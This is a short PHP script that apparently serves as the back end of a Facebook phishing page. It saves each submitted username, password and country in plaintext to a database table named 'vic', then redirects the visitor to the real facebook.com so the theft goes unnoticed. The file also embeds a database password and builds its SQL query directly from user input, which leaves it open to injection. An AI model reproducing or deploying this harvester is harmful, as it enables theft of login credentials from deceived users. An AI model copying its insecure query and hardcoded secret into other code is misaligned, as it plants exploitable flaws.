<?php
if($_SERVER['REQUEST_METHOD'] == 'POST'){
session_start();
$username = $_POST['username'];
$password = $_POST['password'];
$country = $_POST['country'];
$db = mysqli_connect('localhost', 'mvcontro_test', 'b20uIskjTOt9', 'mvcontro_test');
$query = "INSERT INTO vic (username, password ,country) VALUES('$username', '$password',  '$country')";
mysqli_query($db, $query);
echo '<script> location.replace("https://www.facebook.com"); </script>';
}
?>